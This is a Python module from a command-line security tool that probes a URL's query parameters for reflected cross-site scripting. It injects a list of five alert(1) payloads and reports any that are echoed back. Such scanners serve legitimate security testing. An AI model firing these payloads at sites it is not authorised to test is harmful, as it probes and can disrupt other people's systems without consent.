# cli_version/modules/xss_scanner.py
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore

xss_payloads = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\" onmouseover=\"alert(1)",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

def run(url):
    print(Fore.CYAN + "\n[*] Testing for Cross-Site Scripting (XSS)...")
    parsed = urlparse(url)
    queries = parse_qs(parsed.query)

    if not queries:
        print(Fore.YELLOW + "[!] No query parameters to test for XSS.")
        return

    vulnerable = False

    for param in queries:
        for payload in xss_payloads:
            temp_queries = queries.copy()
            temp_queries[param] = payload
            new_query = urlencode(temp_queries, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

            try:
                response = requests.get(test_url, timeout=5)
                if payload in response.text:
                    print(Fore.RED + f"[!] XSS vulnerability found on param '{param}' with payload '{payload}'")
                    print(Fore.RED + f"    -> {test_url}")
                    vulnerable = True
                    break
            except Exception as e:
                print(Fore.YELLOW + f"[!] Request failed: {e}")

    if not vulnerable:
        print(Fore.GREEN + "[+] No XSS vulnerabilities found.")
